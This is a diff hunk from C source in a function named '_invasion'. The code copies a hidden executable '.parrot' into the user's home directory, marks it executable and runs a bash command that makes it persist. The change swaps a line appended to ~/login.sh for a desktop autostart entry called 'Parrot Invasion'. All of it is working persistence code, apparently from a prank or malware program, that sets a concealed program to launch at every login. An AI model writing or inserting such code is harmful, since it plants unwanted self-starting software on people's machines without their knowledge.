@@ -58,11 +58,13 @@ int	_invasion(
 		sprintf(buffer,
 			"mv .parrot ~/.parrot && "
 			"chmod +x ~/.parrot && "
-			"if grep -q 'nohup ~/.parrot &' ~/login.sh; then "
-				"echo 'Already set up.';"
-			"else "
-				"echo 'nohup ~/.parrot &' >> ~/login.sh;"
-			"fi"
+			"echo \""
+			"[Desktop Entry]\n"
+			"Type=Application\n"
+			"Exec=$HOME/.parrot\n"
+			"Comment=Parrot Invasion\n"
+			"Name=Parrot Invasion\n"
+			"\" > ~/.config/autostart/parrot.desktop"
 		);
 		fclose(file);
 		execlp("bash", "bash", "-c", buffer, (char *)NULL);
